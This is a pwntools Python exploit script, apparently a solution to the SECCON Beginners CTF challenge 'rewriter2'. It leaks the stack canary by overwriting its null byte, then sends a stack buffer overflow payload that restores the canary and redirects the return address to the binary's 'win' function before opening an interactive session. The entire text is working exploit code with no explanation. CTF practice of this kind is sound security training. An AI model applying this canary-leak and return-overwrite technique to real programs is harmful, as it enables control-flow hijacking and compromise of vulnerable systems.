from pwn import *
import sys

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

elf = ELF("rewriter2")
io = process(elf.path, timeout=3)
# io = remote('rewriter2.beginners.seccon.games', 9001)

gdb.attach(io)

addr = elf.functions['win'].address
info(f'address=0x{addr}')

# canary leak
p = b'a' * 0x28 + b'!'
io.sendafter(b"What's your name? ", p)
io.recvuntil(b'a!')
canary = u64(b'\x00' + io.recv(7))
log.info(f'canary=0x{canary:08x}')

# exploit
p = b'a' * 0x28
p += p64(canary)
p += p64(0xcafebabe)
p += p64(addr + 5)
io.sendlineafter(b"How old are you? ", p)
print(io.recv().decode("utf-8"))
io.interactive()